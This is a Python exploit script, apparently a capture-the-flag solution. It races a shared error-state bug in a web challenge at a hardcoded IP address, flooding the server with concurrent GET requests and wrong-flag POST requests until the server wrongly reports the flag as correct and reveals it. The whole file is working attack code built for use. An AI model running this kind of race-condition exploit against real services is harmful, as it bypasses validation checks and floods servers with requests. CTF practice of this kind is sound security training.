#!/usr/bin/env python3
import argparse
import re
import threading
import time

import requests


DEFAULT_URL = "http://158.160.221.45:1924/"
FLAG_RE = re.compile(r"LB\{[^<\s]+\}")

thread_local = threading.local()


def session():
    if not hasattr(thread_local, "value"):
        thread_local.value = requests.Session()
    return thread_local.value


def spam_get(url, timeout, stop_event):
    while not stop_event.is_set():
        try:
            session().get(url, timeout=timeout)
        except requests.RequestException:
            pass


def spam_post(url, timeout, bad_flag, stop_event, result):
    while not stop_event.is_set():
        try:
            r = session().post(url, data={"flag": bad_flag}, timeout=timeout)
        except requests.RequestException:
            continue

        if "Correct! Here is your flag:" not in r.text:
            continue

        m = FLAG_RE.search(r.text)
        result.append(m.group(0) if m else r.text)
        stop_event.set()
        return


def main():
    ap = argparse.ArgumentParser(description="Race the shared err bug in web chall2.")
    ap.add_argument("--url", default=DEFAULT_URL, help="target base URL")
    ap.add_argument("--get-workers", type=int, default=40, help="number of concurrent GET workers")
    ap.add_argument("--post-workers", type=int, default=40, help="number of concurrent POST workers")
    ap.add_argument("--timeout", type=float, default=2.0, help="per-request timeout in seconds")
    ap.add_argument("--duration", type=float, default=30.0, help="max runtime in seconds")
    ap.add_argument("--bad-flag", default="LB{nope}", help="incorrect flag value used for POSTs")
    args = ap.parse_args()

    stop_event = threading.Event()
    result = []
    threads = []

    for _ in range(args.get_workers):
        t = threading.Thread(
            target=spam_get,
            args=(args.url, args.timeout, stop_event),
            daemon=True,
        )
        t.start()
        threads.append(t)

    for _ in range(args.post_workers):
        t = threading.Thread(
            target=spam_post,
            args=(args.url, args.timeout, args.bad_flag, stop_event, result),
            daemon=True,
        )
        t.start()
        threads.append(t)

    deadline = time.time() + args.duration
    while time.time() < deadline and not stop_event.is_set():
        time.sleep(0.05)

    stop_event.set()

    if result:
        print(result[0])
        return

    raise SystemExit("flag not recovered before timeout")


if __name__ == "__main__":
    main()
